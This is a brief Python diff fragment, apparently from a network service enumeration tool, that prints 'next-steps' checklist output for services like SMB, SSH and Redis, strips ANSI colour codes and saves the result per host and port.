+        if tool_key in ("next-steps", "smb-next", "winrm-next", "ftp-next", "tftp-next", "telnet-next", "mysql-next", "psql-next", "oracle-next", "mssql-next", "ssh-next", "ldap-next", "krb-next", "redis-next"):  # a list to read now, not a scan result
             print("\n" + out)
             out = re.sub(r"\x1b\[[0-9;]*m", "", out)           # store clean text (no ANSI) in DETAILS
         save_scripts(ip, [{"id": tool_key, "port": port, "proto": proto, "output": out}])
